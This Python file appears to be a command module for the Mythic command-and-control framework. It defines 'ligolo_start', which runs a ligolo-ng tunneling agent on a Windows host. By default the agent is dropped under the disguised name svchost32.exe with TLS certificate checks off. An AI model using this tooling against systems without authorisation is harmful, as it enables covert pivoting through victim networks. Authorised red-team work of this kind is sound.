import json as _json
from mythic_container.MythicCommandBase import *


class LigoloStartArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="connect",
                cli_name="Connect",
                display_name="Proxy Address",
                type=ParameterType.String,
                description="host:port (TCP/TLS) or ws://host:port",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=0)],
            ),
            CommandParameter(
                name="remote_path",
                cli_name="RemotePath",
                display_name="Drop Path",
                type=ParameterType.String,
                default_value=r"C:\Windows\Temp\svchost32.exe",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="ignore_cert",
                cli_name="IgnoreCert",
                display_name="Ignore TLS Cert",
                type=ParameterType.Boolean,
                default_value=True,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
            CommandParameter(
                name="retry",
                cli_name="Retry",
                display_name="Auto-Retry",
                type=ParameterType.Boolean,
                default_value=True,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="bind",
                cli_name="Bind",
                display_name="Bind Address",
                type=ParameterType.String,
                description="Bind to ip:port instead of connecting out.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
            CommandParameter(
                name="accept_fingerprint",
                cli_name="AcceptFingerprint",
                display_name="Accept Fingerprint",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
            ),
            CommandParameter(
                name="proxy",
                cli_name="Proxy",
                display_name="Proxy URL",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=6)],
            ),
            CommandParameter(
                name="user_agent",
                cli_name="UserAgent",
                display_name="User-Agent",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=7)],
            ),
            CommandParameter(
                name="verbose",
                cli_name="Verbose",
                display_name="Verbose",
                type=ParameterType.Boolean,
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=8)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            return
        cmd = self.command_line.strip()
        if cmd.startswith("{"):
            self.load_args_from_json_string(cmd)
        else:
            self.load_args_from_json_string(_json.dumps({"connect": cmd}))


class LigoloStartCommand(CommandBase):
    cmd = "ligolo_start"
    needs_admin = False
    help_cmd = "ligolo_start 10.0.0.1:11601"
    description = (
        "Start a ligolo-ng agent session.\n"
        "Start proxy first: ./proxy -selfcert -laddr 0.0.0.0:11601"
    )
    version = 1
    author = "@goultarde"
    argument_class = LigoloStartArguments
    attackmapping = ["T1090", "T1572", "T1071.001"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        connect     = taskData.args.get_arg("connect") or ""
        bind_addr   = taskData.args.get_arg("bind") or ""
        remote_path = taskData.args.get_arg("remote_path") or r"C:\Windows\Temp\svchost32.exe"

        if not connect and not bind_addr:
            raise Exception("connect or bind is required")

        target = bind_addr if bind_addr else connect
        response.DisplayParams = f"{target} -> {remote_path}"
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
